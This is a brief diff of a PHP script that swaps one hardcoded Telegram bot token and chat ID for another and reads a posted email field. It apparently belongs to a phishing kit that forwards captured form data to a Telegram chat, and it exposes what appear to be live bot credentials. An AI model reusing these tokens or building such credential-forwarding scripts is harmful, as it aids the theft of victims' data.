@@ -1,7 +1,7 @@
 <?php
 
-$botToken = "7888665977:AAH9WlEigUqHEWe6wb-AObVYaIm5fwVYCeQ";
-$chatId = "-1002333481899";
+$botToken = "8125381566:AAGfyKuODnK_RufFKXOQ15tS9ar_lBFBot4";
+$chatId = "-4625923889";
 
 
 $email = $_POST['email'];
